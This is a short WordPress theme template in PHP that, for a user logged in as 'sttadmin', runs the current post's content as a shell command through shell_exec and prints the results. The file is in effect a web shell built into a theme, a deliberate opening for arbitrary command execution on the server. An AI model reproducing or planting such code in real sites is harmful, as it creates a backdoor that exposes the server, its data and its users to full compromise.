<?php
if (!is_user_logged_in() || wp_get_current_user()->user_login != 'sttadmin') {
  require('template-empty.php');
  exit;
}

the_post();
$content = get_the_content();
echo 'Executing: <br>';
get_template_part('content');
$old_path = getcwd();
chdir(get_template_directory());
echo '<br>Results: <br>';
echo shell_exec($content);
chdir($old_path);
?>